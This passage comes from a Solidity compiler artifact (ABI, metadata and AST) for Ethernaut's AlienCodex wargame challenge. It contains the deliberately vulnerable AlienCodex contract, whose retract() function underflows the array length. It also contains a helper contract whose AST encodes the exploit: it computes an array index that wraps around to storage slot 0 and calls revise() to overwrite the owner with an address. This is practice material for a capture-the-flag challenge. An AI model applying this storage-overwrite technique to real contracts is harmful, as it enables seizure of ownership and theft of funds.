						"legacyAssembly": null,
						"methodIdentifiers": {
							"isOwner()": "8f32d59b",
							"owner()": "8da5cb5b",
							"renounceOwnership()": "715018a6",
							"transferOwnership(address)": "f2fde38b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":\"Ownable\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":{\"keccak256\":\"0x4d3de93fedfe39152201ffcc94cb9fa8ad80e5eae754e97c714057038f6beb5d\",\"urls\":[\"bzz-raw://a140c5698887488c3af1dcb9b661e83bcd9392449db8e111a19d5ba012f46208\",\"dweb:/ipfs/QmaK15toJWNimvohnYNTfvZK7akJUkWVVZajA1x638iRnP\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 112,
								"contract": "https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol:Ownable",
								"label": "_owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"contracts/Ethernaut/AlienCodex.sol": {
				"ast": {
					"absolutePath": "contracts/Ethernaut/AlienCodex.sol",
					"exportedSymbols": {
						"AlienCodex": [
							67
						]
					},
					"id": 68,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 68,
							"sourceUnit": 218,
							"src": "60:101:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 3,
										"name": "Ownable",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 217,
										"src": "188:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Ownable_$217",
											"typeString": "contract Ownable"
										}
									},
									"id": 4,
									"nodeType": "InheritanceSpecifier",
									"src": "188:7:0"
								}
							],
							"contractDependencies": [
								217
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 67,
							"linearizedBaseContracts": [
								67,
								217
							],
							"name": "AlienCodex",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 6,
									"name": "contact",
									"nodeType": "VariableDeclaration",
									"scope": 67,
									"src": "203:19:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bool",
										"typeString": "bool"
									},
									"typeName": {
										"id": 5,
										"name": "bool",
										"nodeType": "ElementaryTypeName",
										"src": "203:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bool",
											"typeString": "bool"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 9,
									"name": "codex",
									"nodeType": "VariableDeclaration",
									"scope": 67,
									"src": "227:22:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_array$_t_bytes32_$dyn_storage",
										"typeString": "bytes32[]"
									},
									"typeName": {
										"baseType": {
											"id": 7,
											"name": "bytes32",
											"nodeType": "ElementaryTypeName",
											"src": "227:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_bytes32",
												"typeString": "bytes32"
											}
										},
										"id": 8,
										"length": null,
										"nodeType": "ArrayTypeName",
										"src": "227:9:0",
										"typeDescriptions": {
											"typeIdentifier": "t_array$_t_bytes32_$dyn_storage_ptr",
											"typeString": "bytes32[]"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 16,
										"nodeType": "Block",
										"src": "277:36:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 12,
															"name": "contact",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 6,
															"src": "291:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 11,
														"name": "assert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 221,
														"src": "284:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_assert_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "284:15:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "284:15:0"
											},
											{
												"id": 15,
												"nodeType": "PlaceholderStatement",
												"src": "306:1:0"
											}
										]
									},
									"documentation": null,
									"id": 17,
									"name": "contacted",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "274:2:0"
									},
									"src": "256:57:0",
									"visibility": "internal"
								},
								{
									"body": {
										"id": 24,
										"nodeType": "Block",
										"src": "352:27:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 22,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 20,
														"name": "contact",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 6,
														"src": "359:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "74727565",
														"id": 21,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "369:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"src": "359:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 23,
												"nodeType": "ExpressionStatement",
												"src": "359:14:0"
											}
										]
									},
									"documentation": null,
									"id": 25,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "make_contact",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 18,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "342:2:0"
									},
									"returnParameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "352:0:0"
									},
									"scope": 67,
									"src": "321:58:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 38,
										"nodeType": "Block",
										"src": "436:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 35,
															"name": "_content",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 27,
															"src": "453:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 32,
															"name": "codex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "442:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_array$_t_bytes32_$dyn_storage",
																"typeString": "bytes32[] storage ref"
															}
														},
														"id": 34,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "push",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "442:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_arraypush_nonpayable$_t_bytes32_$returns$_t_uint256_$",
															"typeString": "function (bytes32) returns (uint256)"
														}
													},
													"id": 36,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "442:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 37,
												"nodeType": "ExpressionStatement",
												"src": "442:20:0"
											}
										]
									},
									"documentation": null,
									"id": 39,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 30,
											"modifierName": {
												"argumentTypes": null,
												"id": 29,
												"name": "contacted",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 17,
												"src": "419:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "419:9:0"
										}
									],
									"name": "record",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 28,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 27,
												"name": "_content",
												"nodeType": "VariableDeclaration",
												"scope": 39,
												"src": "401:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 26,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "401:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "400:18:0"
									},
									"returnParameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "436:0:0"
									},
									"scope": 67,
									"src": "385:83:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 49,
										"nodeType": "Block",
										"src": "510:27:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 47,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "UnaryOperation",
													"operator": "--",
													"prefix": false,
													"src": "517:14:0",
													"subExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 44,
															"name": "codex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "517:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_array$_t_bytes32_$dyn_storage",
																"typeString": "bytes32[] storage ref"
															}
														},
														"id": 46,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "517:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 48,
												"nodeType": "ExpressionStatement",
												"src": "517:14:0"
											}
										]
									},
									"documentation": null,
									"id": 50,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 42,
											"modifierName": {
												"argumentTypes": null,
												"id": 41,
												"name": "contacted",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 17,
												"src": "493:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "493:9:0"
										}
									],
									"name": "retract",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "490:2:0"
									},
									"returnParameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "510:0:0"
									},
									"scope": 67,
									"src": "474:63:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 65,
										"nodeType": "Block",
										"src": "602:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 63,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 59,
															"name": "codex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "609:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_array$_t_bytes32_$dyn_storage",
																"typeString": "bytes32[] storage ref"
															}
														},
														"id": 61,
														"indexExpression": {
															"argumentTypes": null,
															"id": 60,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 52,
															"src": "615:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "609:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 62,
														"name": "_content",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "620:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"src": "609:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"id": 64,
												"nodeType": "ExpressionStatement",
												"src": "609:19:0"
											}
										]
									},
									"documentation": null,
									"id": 66,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 57,
											"modifierName": {
												"argumentTypes": null,
												"id": 56,
												"name": "contacted",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 17,
												"src": "585:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "585:9:0"
										}
									],
									"name": "revise",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 55,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"name": "i",
												"nodeType": "VariableDeclaration",
												"scope": 66,
												"src": "559:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 51,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "559:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 54,
												"name": "_content",
												"nodeType": "VariableDeclaration",
												"scope": 66,
												"src": "567:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 53,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "567:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "558:26:0"
									},
									"returnParameters": {
										"id": 58,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "602:0:0"
									},
									"scope": 67,
									"src": "543:91:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 68,
							"src": "165:472:0"
						}
					],
					"src": "33:604:0"
				},
				"id": 0
			},
			"contracts/Ethernaut/AlienCodexHelper.sol": {
				"ast": {
					"absolutePath": "contracts/Ethernaut/AlienCodexHelper.sol",
					"exportedSymbols": {
						"AlienCodexHelper": [
							108
						]
					},
					"id": 109,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 69,
							"literals": [
								"solidity",
								"^",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:1"
						},
						{
							"absolutePath": "contracts/Ethernaut/AlienCodex.sol",
							"file": "./AlienCodex.sol",
							"id": 70,
							"nodeType": "ImportDirective",
							"scope": 109,
							"sourceUnit": 68,
							"src": "58:26:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 108,
							"linearizedBaseContracts": [
								108
							],
							"name": "AlienCodexHelper",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 106,
										"nodeType": "Block",
										"src": "169:233:1",
										"statements": [
											{
												"assignments": [
													76
												],
												"declarations": [
													{
														"constant": false,
														"id": 76,
														"name": "slotIndex",
														"nodeType": "VariableDeclaration",
														"scope": 106,
														"src": "180:14:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 75,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "180:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 78,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "31",
													"id": 77,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "197:1:1",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_1_by_1",
														"typeString": "int_const 1"
													},
													"value": "1"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "180:18:1"
											},
											{
												"assignments": [
													80
												],
												"declarations": [
													{
														"constant": false,
														"id": 80,
														"name": "i",
														"nodeType": "VariableDeclaration",
														"scope": 106,
														"src": "209:6:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 79,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "209:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 97,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 96,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 94,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_rational_115792089237316195423570985008687907853269984665640564039457584007913129639935_by_1",
																"typeString": "int_const 1157...(70 digits omitted)...9935"
															},
															"id": 85,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_rational_115792089237316195423570985008687907853269984665640564039457584007913129639936_by_1",
																	"typeString": "int_const 1157...(70 digits omitted)...9936"
																},
																"id": 83,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"hexValue": "32",
																	"id": 81,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "218:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_2_by_1",
																		"typeString": "int_const 2"
																	},
																	"value": "2"
																},
																"nodeType": "BinaryOperation",
																"operator": "**",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "323536",
																	"id": 82,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "221:3:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_256_by_1",
																		"typeString": "int_const 256"
																	},
																	"value": "256"
																},
																"src": "218:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_115792089237316195423570985008687907853269984665640564039457584007913129639936_by_1",
																	"typeString": "int_const 1157...(70 digits omitted)...9936"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 84,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "227:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1_by_1",
																	"typeString": "int_const 1"
																},
																"value": "1"
															},
															"src": "218:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_115792089237316195423570985008687907853269984665640564039457584007913129639935_by_1",
																"typeString": "int_const 1157...(70 digits omitted)...9935"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 90,
																					"name": "slotIndex",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 76,
																					"src": "263:9:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 88,
																					"name": "abi",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 219,
																					"src": "246:3:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_magic_abi",
																						"typeString": "abi"
																					}
																				},
																				"id": 89,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"memberName": "encodePacked",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "246:16:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																					"typeString": "function () pure returns (bytes memory)"
																				}
																			},
																			"id": 91,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "246:27:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes_memory_ptr",
																				"typeString": "bytes memory"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes_memory_ptr",
																				"typeString": "bytes memory"
																			}
																		],
																		"id": 87,
																		"name": "keccak256",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 226,
																		"src": "236:9:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																			"typeString": "function (bytes memory) pure returns (bytes32)"
																		}
																	},
																	"id": 92,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "236:38:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																],
																"id": 86,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "231:4:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_uint256_$",
																	"typeString": "type(uint256)"
																},
																"typeName": "uint"
															},
															"id": 93,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "231:44:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "218:57:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 95,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "278:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "218:61:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "209:70:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 102,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 80,
															"src": "324:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "307830303030303030303030303030303030303030303030303036333433613432336162343763663932663839653234353131373164333861633164303630366539",
															"id": 103,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "327:66:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_566698534792308166022080138786682799462812092137_by_1",
																"typeString": "int_const 5666...(40 digits omitted)...2137"
															},
															"value": "0x0000000000000000000000006343a423ab47cf92f89e2451171d38ac1d0606e9"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_rational_566698534792308166022080138786682799462812092137_by_1",
																"typeString": "int_const 5666...(40 digits omitted)...2137"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 99,
																	"name": "alienCodexAddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 72,
																	"src": "301:14:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 98,
																"name": "AlienCodex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 67,
																"src": "290:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_AlienCodex_$67_$",
																	"typeString": "type(contract AlienCodex)"
																}
															},
															"id": 100,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "290:26:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_AlienCodex_$67",
																"typeString": "contract AlienCodex"
															}
														},
														"id": 101,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "revise",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 66,
														"src": "290:33:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_bytes32_$returns$__$",
															"typeString": "function (uint256,bytes32) external"
														}
													},
													"id": 104,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
